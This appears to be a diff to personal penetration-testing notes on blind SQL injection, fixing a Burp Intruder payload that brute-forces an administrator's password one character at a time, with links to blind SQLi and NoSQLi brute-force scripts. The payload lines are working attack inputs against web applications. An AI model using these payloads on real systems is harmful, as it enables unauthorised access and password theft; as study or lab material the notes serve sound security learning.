@@ -10,7 +10,7 @@ The ball keeps on rolling, and we can begin the makings of bruteforce attack by 
 `b' OR (select 'a' from users where username='administrator' and length(password)>1)='a;`  
 Once we have the length of the password we can bruteforce with a python script or intruder.
 For intruder we use cluster bomb, and use the grep option to flag responses we know differ in `FALSE` and `TRUE`  
-`b' OR (select (substring,§1§,1) from users where username='administrator')='§a§`  
+`b' OR (select substring (password,§1§,1) from users where username='administrator')='§a§`  
 
 
 #### Example PoCs: [BlindSQLI Brute](https://github.com/kymb0/General_code_repo/blob/master/Code_templates/bruteforce_blindsqli.py) [BlindNOsqli Brute](https://github.com/kymb0/General_code_repo/blob/master/Code_templates/brute_mongoDB_nosqli.py)
